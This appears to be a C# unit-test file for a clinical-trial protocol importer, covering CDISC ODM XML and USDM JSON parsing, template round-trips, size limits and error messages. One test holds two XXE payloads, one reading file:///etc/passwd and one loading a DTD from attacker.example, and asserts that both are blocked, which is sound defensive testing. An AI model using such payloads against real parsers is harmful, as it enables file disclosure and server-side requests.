using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;

using Cadence.Ddf;
using Cadence.Kernel;
using Cadence.Kernel.Knowledge;
using Cadence.Kernel.Protocol.Design;
using Cadence.Kernel.Protocol.Import;

using FluentAssertions;

using Xunit;

namespace Cadence.UnitTests.Packages;

/// <summary>
/// Unit tests for <see cref="OdmDesignImporter"/>, <see cref="CdiscLibraryTemplateCatalog"/>, and
/// <see cref="ProtocolDesignImporterService"/> covering all 36 bundled CDISC Library eCRF files, item prompts, display
/// order, mandatory flags, import notes, 10 MB payload limits, and DTD/XXE blocking.
/// </summary>
[Trait("Category", "Unit")]
public sealed class OdmDesignImporterTests
{
    private static ProtocolConceptResolver AlwaysSponsorConcept() =>
        (candidate, _) =>
        {
            var concept = new ConceptRef(ConceptId.New(), 1);
            var usedFallback = !string.IsNullOrWhiteSpace(candidate.BiomedicalConceptCode);
            return ValueTask.FromResult(new ProtocolConceptResolution(concept, UsedFallbackSponsorConcept: usedFallback));
        };

    [Fact]
    public void BundledCatalog_DiscoversAll36CdiscLibraryTemplates()
    {
        var catalog = new CdiscLibraryTemplateCatalog();

        var templates = catalog.ListTemplates();

        templates.Should().HaveCount(36);
        templates.Select(t => t.Id).Should().OnlyHaveUniqueItems();
        templates.Should().Contain(t => t.FileName == "AE_XML.xml" && t.FormName.Length > 0 && t.ItemCount > 0);
        templates.Should().Contain(t => t.FileName == "LB_LOCAL_XML.txt" && t.ItemCount > 0);
        templates.Should().Contain(t => t.FileName == "DD_XML.xml" && t.ItemCount > 0);
    }

    [Fact]
    public async Task All36BundledCdiscTemplates_PreserveFormNamesPromptsOrderAndMandatoryFlags()
    {
        var catalog = new CdiscLibraryTemplateCatalog();
        var service = new ProtocolDesignImporterService(catalog);
        var templates = catalog.ListTemplates();
        templates.Should().HaveCount(36);

        foreach (var template in templates)
        {
            var rawBytes = catalog.ReadTemplateBytes(template.Id);
            rawBytes.Should().NotBeNull($"template {template.Id} ({template.FileName}) must be readable");

            var result = await service.ImportAsync(
                new ProtocolDesignImportRequest(RawBytes: rawBytes, FileName: template.FileName, Format: ProtocolImportFormat.OdmXml),
                AlwaysSponsorConcept(),
                TestContext.Current.CancellationToken);

            result.IsSuccess.Should().BeTrue($"template {template.Id} ({template.FileName}) failed with: {string.Join("; ", result.Problems)}");
            result.Design.Should().NotBeNull();

            // Verify round-trip through canonical ProtocolDesignDocument reader/writer.
            var roundTrip = ProtocolDesignDocument.Read(ProtocolDesignDocument.Write(result.Design!));
            roundTrip.IsValid.Should().BeTrue($"template {template.Id} produced invalid ProtocolDesign: {string.Join("; ", roundTrip.Problems)}");

            // Compare directly against raw XML expectations for form name, item count, order, prompt, and mandatory flag.
            var expectedForms = ReadExpectedOdmForms(rawBytes!);
            result.Design!.CollectionSpecs.Should().HaveCount(expectedForms.Count, $"template {template.FileName}");

            for (int f = 0; f < expectedForms.Count; f++)
            {
                var expectedForm = expectedForms[f];
                var actualForm = result.Design.CollectionSpecs[f];

                actualForm.Name.Should().Be(expectedForm.Name, $"form name in {template.FileName}");
                actualForm.Items.Should().HaveCount(expectedForm.Items.Count, $"item count in {template.FileName}");

                for (int i = 0; i < expectedForm.Items.Count; i++)
                {
                    var expItem = expectedForm.Items[i];
                    var actItem = actualForm.Items[i];
                    actItem.Prompt.Should().Be(expItem.Prompt, $"prompt at position {i + 1} ({expItem.ItemOid}) in {template.FileName}");
                    actItem.Required.Should().Be(expItem.Mandatory, $"mandatory flag at position {i + 1} ({expItem.ItemOid}) in {template.FileName}");
                }
            }
        }
    }

    [Fact]
    public async Task ImportingAll36TemplatesTogether_DisambiguatesDuplicateOidsAndProducesValidDesign()
    {
        var catalog = new CdiscLibraryTemplateCatalog();
        var service = new ProtocolDesignImporterService(catalog);
        var allIds = catalog.ListTemplates().Select(t => t.Id).ToList();

        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(TemplateIds: allIds, FallbackTitle: "Combined CDISC eCRF Suite"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeTrue(string.Join("; ", result.Problems));
        result.Design!.CollectionSpecs.Should().HaveCountGreaterThanOrEqualTo(36);
        result.Design.Elements().Select(e => e.Id).Should().OnlyHaveUniqueItems();
    }

    [Fact]
    public async Task OdmWithUnmappedTerminologyAndVendorExtensions_AttachesReadableImportNotes()
    {
        const string odm = """
            <?xml version="1.0" encoding="UTF-8"?>
            <ODM xmlns="http://www.cdisc.org/ns/odm/v1.3"
                 xmlns:mdsol="http://www.mdsol.com/ns/odm/metadata"
                 FileOID="ODM.VENDOR.1"
                 FileType="Snapshot"
                 ODMVersion="1.3.2"
                 CreationDateTime="2026-01-10T00:00:00Z"
                 Originator="Sponsor EDC">
              <Study OID="S.101">
                <GlobalVariables>
                  <StudyName>Vendor Annotated Study</StudyName>
                  <StudyDescription>Test</StudyDescription>
                  <ProtocolName>VAS-101</ProtocolName>
                </GlobalVariables>
                <MetaDataVersion OID="MDV.1" Name="v1">
                  <FormDef OID="F.VITALS" Name="Vital Signs" Repeating="No" mdsol:ControlType="Grid">
                    <ItemGroupRef ItemGroupOID="IG.VITALS" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <ItemGroupDef OID="IG.VITALS" Name="Vitals Group" Repeating="No">
                    <ItemRef ItemOID="IT.POS" OrderNumber="2" Mandatory="No"/>
                    <ItemRef ItemOID="IT.SYSBP" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemDef OID="IT.SYSBP" Name="SYSBP" DataType="integer" CustomVendorAttr="custom-flag">
                    <Question><TranslatedText xml:lang="en">Systolic Blood Pressure (mmHg)</TranslatedText></Question>
                    <Alias Context="CDASH/SDTM" Name="extCodeID: C25298"/>
                  </ItemDef>
                  <ItemDef OID="IT.POS" Name="VSPOS" DataType="text">
                    <Alias Context="prompt" Name="Body Position"/>
                    <CodeListRef CodeListOID="CL.POS"/>
                  </ItemDef>
                  <CodeList OID="CL.POS" Name="Position" DataType="text">
                    <CodeListItem CodedValue="SITTING"><Decode><TranslatedText>Sitting</TranslatedText></Decode></CodeListItem>
                    <CodeListItem CodedValue="STANDING"><Decode><TranslatedText>Standing</TranslatedText></Decode></CodeListItem>
                  </CodeList>
                  <mdsol:CustomExtension OID="EXT.1"/>
                </MetaDataVersion>
              </Study>
            </ODM>
            """;

        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(odm), FileName: "vitals.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeTrue(string.Join("; ", result.Problems));
        var form = result.Design!.CollectionSpecs.Should().ContainSingle().Subject;
        form.Name.Should().Be("Vital Signs");

        // OrderNumber="1" (IT.SYSBP) must precede OrderNumber="2" (IT.POS) despite reversed document order.
        form.Items.Select(i => i.Prompt).Should().Equal("Systolic Blood Pressure (mmHg)", "Body Position");
        form.Items.Select(i => i.Required).Should().Equal(true, false);

        result.Notes.Should().Contain(n => n.Message.Contains("Originator", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("ControlType", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("CustomVendorAttr", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("CustomExtension", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("CL.POS", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("C25298", StringComparison.Ordinal));
        result.Design.ImportNotes.Should().NotBeNullOrEmpty();
    }

    [Fact]
    public async Task UsdmV4WithUnmappedConceptAndVendorExtension_CreatesDesignWithNotes()
    {
        const string usdm = """
            {
              "usdmVersion": "4.0.0",
              "study": {
                "id": "Study_USDM_1",
                "name": "CADENCE-USDM",
                "extensionAttributes": [
                  { "url": "https://vendor.example/usdm/edc-layout", "valueString": "compact" }
                ],
                "versions": [
                  {
                    "id": "SV_1",
                    "titles": [
                      { "id": "T_1", "text": "USDM Imported Trial", "type": { "code": "C207616", "decode": "Official Study Title" } }
                    ],
                    "biomedicalConcepts": [
                      {
                        "id": "BC_HR",
                        "name": "Heart Rate",
                        "label": "Pulse Rate (beats/min)",
                        "code": { "id": "AC_1", "standardCode": { "code": "C49677", "decode": "Heart Rate" } }
                      }
                    ],
                    "studyDesigns": [
                      {
                        "id": "SD_1",
                        "epochs": [ { "id": "EP_1", "name": "Screening" } ],
                        "encounters": [ { "id": "ENC_1", "name": "Screening Visit" } ],
                        "activities": [
                          { "id": "ACT_VITALS", "name": "Vital Signs Assessment", "biomedicalConceptIds": [ "BC_HR" ] }
                        ],
                        "scheduleTimelines": [
                          {
                            "id": "TL_1",
                            "mainTimeline": true,
                            "entryId": "SAI_1",
                            "instances": [
                              {
                                "id": "SAI_1",
                                "instanceType": "ScheduledActivityInstance",
                                "epochId": "EP_1",
                                "encounterId": "ENC_1",
                                "activityIds": [ "ACT_VITALS" ]
                              }
                            ],
                            "timings": [
                              {
                                "id": "TIM_1",
                                "type": { "code": "C71148", "decode": "Fixed Reference" },
                                "value": "P1D",
                                "relativeFromScheduledInstanceId": "SAI_1",
                                "relativeToScheduledInstanceId": "SAI_1"
                              }
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              }
            }
            """;

        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(usdm), FileName: "study.json"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeTrue(string.Join("; ", result.Problems));
        result.Design!.Title.Should().Be("USDM Imported Trial");
        var spec = result.Design.CollectionSpecs.Should().ContainSingle().Subject;
        spec.Name.Should().Be("Vital Signs Assessment");
        spec.Items.Should().ContainSingle().Which.Prompt.Should().Be("Pulse Rate (beats/min)");
        result.Notes.Should().Contain(n => n.Message.Contains("C49677", StringComparison.Ordinal));
        result.Notes.Should().Contain(n => n.Message.Contains("edc-layout", StringComparison.Ordinal));
    }

    [Fact]
    public async Task OdmExceeding10Megabytes_IsRejectedSynchronously()
    {
        var oversized = new byte[IProtocolDesignImporter.MaxPayloadBytes + 1];
        Array.Fill(oversized, (byte)' ');

        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: oversized, FileName: "huge.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeFalse();
        result.PayloadTooLarge.Should().BeTrue();
        result.Problems.Should().ContainSingle(p => p.Contains("10 MB", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("<?xml version=\"1.0\"?><!DOCTYPE ODM [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><ODM>&xxe;</ODM>")]
    [InlineData("<?xml version=\"1.0\"?><!DOCTYPE ODM SYSTEM \"http://attacker.example/odm.dtd\"><ODM/>")]
    public async Task OdmWithDoctypeOrExternalEntity_IsBlocked(string xxePayload)
    {
        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(xxePayload), FileName: "xxe.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeFalse();
        result.Problems.Should().ContainSingle(p => p.Contains("DTD", StringComparison.OrdinalIgnoreCase) || p.Contains("DOCTYPE", StringComparison.OrdinalIgnoreCase));
    }

    [Theory]
    [InlineData("<ODM><Study><MetaDataVersion>", "Malformed ODM XML")]
    [InlineData("<NotODM/>", "Expected root <ODM>")]
    [InlineData("<ODM xmlns=\"http://www.cdisc.org/ns/odm/v1.3\"><Study OID=\"S1\"><MetaDataVersion OID=\"M1\"/></Study></ODM>", "no <FormDef>")]
    public async Task MalformedOdmXml_ReturnsActionableErrorMessages(string invalidXml, string expectedSubstring)
    {
        var service = new ProtocolDesignImporterService();
        var result = await service.ImportAsync(
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(invalidXml), FileName: "broken.xml"),
            AlwaysSponsorConcept(),
            TestContext.Current.CancellationToken);

        result.IsSuccess.Should().BeFalse();
        result.Problems.Should().Contain(p => p.Contains(expectedSubstring, StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public async Task BatchAndSequentialResolvers_ProduceIdenticalJsonPromptsFlagsAndNotes_AcrossAll36TemplatesAnd500Items()
    {
        var ct = TestContext.Current.CancellationToken;
        var catalog = new CdiscLibraryTemplateCatalog();
        var service = new ProtocolDesignImporterService(catalog);
        var allIds = catalog.ListTemplates().Select(t => t.Id).ToList();

        static ConceptRef DeterministicConceptRef(ProtocolConceptCandidate candidate)
        {
            var hash = SHA256.HashData(Encoding.UTF8.GetBytes(candidate.StableKey));
            Span<byte> guid = stackalloc byte[16];
            hash.AsSpan(0, 16).CopyTo(guid);
            guid[6] = (byte)((guid[6] & 0x0F) | 0x70);
            guid[8] = (byte)((guid[8] & 0x3F) | 0x80);
            return new ConceptRef(ConceptId.FromGuid(new Guid(guid)), 1);
        }

        ProtocolConceptResolver sequentialResolver = (candidate, _) =>
            ValueTask.FromResult(new ProtocolConceptResolution(
                DeterministicConceptRef(candidate),
                UsedFallbackSponsorConcept: !string.IsNullOrWhiteSpace(candidate.BiomedicalConceptCode)));

        int batchCallCount = 0;
        int lastBatchCandidateCount = 0;
        ProtocolConceptBatchResolver batchResolver = (candidates, _) =>
        {
            batchCallCount++;
            lastBatchCandidateCount = candidates.Count;
            var dict = new Dictionary<string, ProtocolConceptResolution>(candidates.Count, StringComparer.Ordinal);
            foreach (var c in candidates)
            {
                dict[c.StableKey] = new ProtocolConceptResolution(
                    DeterministicConceptRef(c),
                    UsedFallbackSponsorConcept: !string.IsNullOrWhiteSpace(c.BiomedicalConceptCode));
            }

            return ValueTask.FromResult<IReadOnlyDictionary<string, ProtocolConceptResolution>>(dict);
        };

        // 1. Combined 36 bundled CDISC templates (286 unique concepts resolved in 1 batch call).
        var combinedRequest = new ProtocolDesignImportRequest(TemplateIds: allIds, FallbackTitle: "Combined CDISC eCRF Suite");
        var seqCombined = await service.ImportAsync(combinedRequest, sequentialResolver, ct);
        var batchCombined = await service.ImportAsync(combinedRequest, batchResolver, ct);

        seqCombined.IsSuccess.Should().BeTrue();
        batchCombined.IsSuccess.Should().BeTrue();
        batchCallCount.Should().Be(1, "all 36 templates must resolve unique concept candidates in one batch call");
        lastBatchCandidateCount.Should().Be(286);
        ProtocolDesignDocument.Write(batchCombined.Design!).Should().Be(ProtocolDesignDocument.Write(seqCombined.Design!));
        batchCombined.Notes.Should().Equal(seqCombined.Notes);

        // 2. Synthetic 500-item ODM XML with mixed mandatory flags, reversed OrderNumbers, ExtCodeIDs, and vendor attributes.
        var odm500 = BuildSynthetic500ItemOdmXml();
        var odm500Request = new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(odm500), FileName: "casebook-500.xml");
        batchCallCount = 0;
        var seq500 = await service.ImportAsync(odm500Request, sequentialResolver, ct);
        var batch500 = await service.ImportAsync(odm500Request, batchResolver, ct);

        seq500.IsSuccess.Should().BeTrue();
        batch500.IsSuccess.Should().BeTrue();
        batchCallCount.Should().Be(1);
        lastBatchCandidateCount.Should().Be(500);
        ProtocolDesignDocument.Write(batch500.Design!).Should().Be(ProtocolDesignDocument.Write(seq500.Design!));
        batch500.Notes.Should().Equal(seq500.Notes);
    }

    [Fact]
    public async Task ValidationFailuresAcrossOdmTemplatesAndUsdm_NeverInvokeConceptResolver()
    {
        var ct = TestContext.Current.CancellationToken;
        var service = new ProtocolDesignImporterService();
        int resolverCalls = 0;

        ProtocolConceptBatchResolver countingResolver = (candidates, _) =>
        {
            resolverCalls++;
            return ValueTask.FromResult<IReadOnlyDictionary<string, ProtocolConceptResolution>>(
                new Dictionary<string, ProtocolConceptResolution>(StringComparer.Ordinal));
        };

        // Valid Form 1 followed by broken Form 2 (dangling ItemOID) must fail before concept resolution.
        const string brokenSecondFormOdm = """
            <?xml version="1.0" encoding="UTF-8"?>
            <ODM xmlns="http://www.cdisc.org/ns/odm/v1.3" FileOID="F1" FileType="Snapshot" ODMVersion="1.3.2">
              <Study OID="S1">
                <MetaDataVersion OID="MDV1" Name="v1">
                  <FormDef OID="F.OK" Name="Valid Form" Repeating="No">
                    <ItemGroupRef ItemGroupOID="IG.OK" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <FormDef OID="F.BAD" Name="Broken Form" Repeating="No">
                    <ItemGroupRef ItemGroupOID="IG.BAD" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <ItemGroupDef OID="IG.OK" Name="OK Group" Repeating="No">
                    <ItemRef ItemOID="IT.OK" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemGroupDef OID="IG.BAD" Name="Bad Group" Repeating="No">
                    <ItemRef ItemOID="IT.MISSING" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemDef OID="IT.OK" Name="OK" DataType="text"/>
                </MetaDataVersion>
              </Study>
            </ODM>
            """;

        // Valid Form followed by invalid RangeCheck Comparator must also fail before concept resolution.
        const string brokenRangeCheckOdm = """
            <?xml version="1.0" encoding="UTF-8"?>
            <ODM xmlns="http://www.cdisc.org/ns/odm/v1.3" FileOID="F2" FileType="Snapshot" ODMVersion="1.3.2">
              <Study OID="S2">
                <MetaDataVersion OID="MDV2" Name="v1">
                  <FormDef OID="F.OK" Name="Valid Form" Repeating="No">
                    <ItemGroupRef ItemGroupOID="IG.OK" OrderNumber="1" Mandatory="Yes"/>
                  </FormDef>
                  <ItemGroupDef OID="IG.OK" Name="OK Group" Repeating="No">
                    <ItemRef ItemOID="IT.OK" OrderNumber="1" Mandatory="Yes"/>
                  </ItemGroupDef>
                  <ItemDef OID="IT.OK" Name="OK" DataType="integer">
                    <RangeCheck Comparator="UNSUPPORTED" SoftHard="Hard">
                      <CheckValue>10</CheckValue>
                    </RangeCheck>
                  </ItemDef>
                </MetaDataVersion>
              </Study>
            </ODM>
            """;

        var cases = new[]
        {
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(brokenSecondFormOdm), FileName: "broken2.xml"),
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes(brokenRangeCheckOdm), FileName: "brokenrc.xml"),
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes("<?xml version=\"1.0\"?><!DOCTYPE ODM><ODM/>"), FileName: "dtd.xml"),
            new ProtocolDesignImportRequest(RawBytes: Encoding.UTF8.GetBytes("{malformed json"), FileName: "bad.json"),
            new ProtocolDesignImportRequest(RawBytes: new byte[IProtocolDesignImporter.MaxPayloadBytes + 1], FileName: "oversized.xml"),
            new ProtocolDesignImportRequest(TemplateIds: ["DM_XML", "DOES_NOT_EXIST_TEMPLATE"]),
        };

        foreach (var req in cases)
        {
            var res = await service.ImportAsync(req, countingResolver, ct);
            res.IsSuccess.Should().BeFalse();
        }

        resolverCalls.Should().Be(0, "structural, DTD, size, template, and rule compilation failures must be caught before resolving concepts");
    }

    private static string BuildSynthetic500ItemOdmXml()
    {
        var sb = new StringBuilder();
        sb.AppendLine("""<?xml version="1.0" encoding="UTF-8"?>""");
        sb.AppendLine("""<ODM xmlns="http://www.cdisc.org/ns/odm/v1.3" FileOID="ODM.500" FileType="Snapshot" ODMVersion="1.3.2" Originator="Cadence EDC">""");
        sb.AppendLine("""  <Study OID="S.500"><GlobalVariables><StudyName>500 Item Study</StudyName><StudyDescription>Parity</StudyDescription><ProtocolName>P-500</ProtocolName></GlobalVariables>""");
        sb.AppendLine("""    <MetaDataVersion OID="MDV.500" Name="v1">""");
        sb.AppendLine("""      <FormDef OID="F.500" Name="500 Item Casebook" Repeating="Yes"><ItemGroupRef ItemGroupOID="IG.500" OrderNumber="1" Mandatory="Yes"/></FormDef>""");
        sb.AppendLine("""      <ItemGroupDef OID="IG.500" Name="Main Group" Repeating="No">""");
        for (int i = 500; i >= 1; i--)
        {
            var mandatory = i % 2 == 0 ? "Yes" : "No";
            sb.AppendLine(CultureInfo.InvariantCulture, $"""        <ItemRef ItemOID="IT.{i:D4}" OrderNumber="{i}" Mandatory="{mandatory}"/>""");
        }

        sb.AppendLine("""      </ItemGroupDef>""");
        for (int i = 1; i <= 500; i++)
        {
            sb.AppendLine(CultureInfo.InvariantCulture, $"""      <ItemDef OID="IT.{i:D4}" Name="FLD_{i:D4}" DataType="float">""");
            sb.AppendLine(CultureInfo.InvariantCulture, $"""        <Question><TranslatedText xml:lang="en">Prompt {i:D4}</TranslatedText></Question>""");
            if (i % 3 == 0)
            {
                sb.AppendLine(CultureInfo.InvariantCulture, $"""        <Alias Context="CDASH" Name="extCodeID: C99{i:D4}"/>""");
            }

            sb.AppendLine("""      </ItemDef>""");
        }

        sb.AppendLine("""    </MetaDataVersion></Study></ODM>""");
        return sb.ToString();
    }

    private static List<ExpectedForm> ReadExpectedOdmForms(byte[] xmlBytes)
    {
        using var ms = new MemoryStream(xmlBytes, writable: false);
        var doc = XDocument.Load(ms);
        var mdv = doc.Descendants().First(e => e.Name.LocalName == "MetaDataVersion");
        var itemGroups = mdv.Elements()
            .Where(e => e.Name.LocalName == "ItemGroupDef")
            .ToDictionary(e => e.Attribute("OID")!.Value, StringComparer.Ordinal);
        var items = mdv.Elements()
            .Where(e => e.Name.LocalName == "ItemDef")
            .ToDictionary(e => e.Attribute("OID")!.Value, StringComparer.Ordinal);

        var list = new List<ExpectedForm>();
        foreach (var formDef in mdv.Elements().Where(e => e.Name.LocalName == "FormDef"))
        {
            var formName = formDef.Attribute("Name")?.Value?.Trim() ?? formDef.Attribute("OID")!.Value;
            var expectedItems = new List<ExpectedItem>();
            var orderedGroups = formDef.Elements()
                .Where(e => e.Name.LocalName == "ItemGroupRef")
                .Select((el, idx) => (Element: el, Order: ParseOrder(el), Index: idx))
                .OrderBy(x => x.Order)
                .ThenBy(x => x.Index)
                .Select(x => x.Element);

            foreach (var igRef in orderedGroups)
            {
                var igDef = itemGroups[igRef.Attribute("ItemGroupOID")!.Value];
                var orderedItemRefs = igDef.Elements()
                    .Where(e => e.Name.LocalName == "ItemRef")
                    .Select((el, idx) => (Element: el, Order: ParseOrder(el), Index: idx))
                    .OrderBy(x => x.Order)
                    .ThenBy(x => x.Index)
                    .Select(x => x.Element);

                foreach (var itemRef in orderedItemRefs)
                {
                    var oid = itemRef.Attribute("ItemOID")!.Value;
                    var mandatory = string.Equals(itemRef.Attribute("Mandatory")?.Value, "Yes", StringComparison.OrdinalIgnoreCase);
                    var itemDef = items[oid];
                    expectedItems.Add(new ExpectedItem(oid, ExpectedPrompt(itemDef), mandatory));
                }
            }

            list.Add(new ExpectedForm(formName, expectedItems));
        }

        return list;
    }

    private static int ParseOrder(XElement el) =>
        int.TryParse(el.Attribute("OrderNumber")?.Value, NumberStyles.Integer, CultureInfo.InvariantCulture, out var n)
            ? n
            : int.MaxValue;

    private static string ExpectedPrompt(XElement itemDef)
    {
        foreach (var alias in itemDef.Elements().Where(e => e.Name.LocalName == "Alias"))
        {
            var ctx = new string((alias.Attribute("Context")?.Value ?? string.Empty).Where(char.IsLetterOrDigit).ToArray());
            var name = alias.Attribute("Name")?.Value?.Trim();
            if (string.Equals(ctx, "prompt", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrWhiteSpace(name))
            {
                return name;
            }
        }

        var question = itemDef.Elements().FirstOrDefault(e => e.Name.LocalName == "Question")
            ?.Elements().FirstOrDefault(e => e.Name.LocalName == "TranslatedText")?.Value?.Trim();
        if (!string.IsNullOrWhiteSpace(question))
        {
            return string.Join(' ', question.Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries));
        }

        foreach (var alias in itemDef.Elements().Where(e => e.Name.LocalName == "Alias"))
        {
            var ctx = new string((alias.Attribute("Context")?.Value ?? string.Empty).Where(char.IsLetterOrDigit).ToArray());
            var name = alias.Attribute("Name")?.Value?.Trim();
            if (string.Equals(ctx, "questiontext", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrWhiteSpace(name))
            {
                return name;
            }
        }

        var desc = itemDef.Elements().FirstOrDefault(e => e.Name.LocalName == "Description")
            ?.Elements().FirstOrDefault(e => e.Name.LocalName == "TranslatedText")?.Value?.Trim();
        if (!string.IsNullOrWhiteSpace(desc))
        {
            return string.Join(' ', desc.Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries));
        }

        return itemDef.Attribute("Name")?.Value?.Trim() ?? itemDef.Attribute("OID")!.Value;
    }

    private sealed record ExpectedForm(string Name, List<ExpectedItem> Items);

    private sealed record ExpectedItem(string ItemOid, string Prompt, bool Mandatory);
}
